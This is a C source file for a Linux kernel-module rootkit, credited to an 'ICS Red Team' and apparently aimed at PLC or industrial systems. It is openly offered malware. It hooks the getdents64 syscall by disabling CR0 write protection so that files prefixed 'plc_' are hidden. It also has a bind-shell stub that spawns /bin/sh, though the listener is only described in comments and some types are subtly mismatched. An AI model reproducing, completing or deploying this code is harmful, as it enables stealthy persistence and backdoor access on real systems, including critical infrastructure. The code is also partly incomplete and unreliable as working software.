/* plc_rootkit.c - Loadable kernel module backdoor
 * Hides processes, files, and network connections
 * Provides covert command execution
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ICS Red Team");

#define BACKDOOR_PREFIX "plc_"  // Hide files/processes starting with this

// Syscall table hooking
static unsigned long *__sys_call_table;
typedef asmlinkage long (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
orig_getdents_t orig_getdents;

// Hooked getdents64 - hide files
asmlinkage long hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    long ret = orig_getdents(fd, dirp, count);
    struct linux_dirent64 *cur = dirp;
    unsigned long offset = 0;

    while (offset < ret) {
        // Hide entries starting with BACKDOOR_PREFIX
        if (strncmp(cur->d_name, BACKDOOR_PREFIX, strlen(BACKDOOR_PREFIX)) == 0) {
            // Skip this entry
            unsigned int reclen = cur->d_reclen;
            char *next = (char *)cur + reclen;
            memmove(cur, next, ret - offset - reclen);
            ret -= reclen;
            continue;
        }

        offset += cur->d_reclen;
        cur = (struct linux_dirent64 *)((char *)dirp + offset);
    }

    return ret;
}

// Network backdoor - bind shell on trigger
static int backdoor_shell(void) {
    // Listen on port 31337
    // When connection received, spawn /bin/sh
    call_usermodehelper("/bin/sh", NULL, NULL, UMH_WAIT_EXEC);
    return 0;
}

// Module initialization
static int __init rootkit_init(void) {
    printk(KERN_INFO "PLC Rootkit loaded\n");

    // Find syscall table
    __sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // Disable write protection
    write_cr0(read_cr0() & (~0x10000));

    // Hook syscalls
    orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents64];
    __sys_call_table[__NR_getdents64] = (unsigned long)hook_getdents64;

    // Re-enable write protection
    write_cr0(read_cr0() | 0x10000);

    return 0;
}

static void __exit rootkit_exit(void) {
    // Unhook syscalls
    write_cr0(read_cr0() & (~0x10000));
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents;
    write_cr0(read_cr0() | 0x10000);

    printk(KERN_INFO "PLC Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
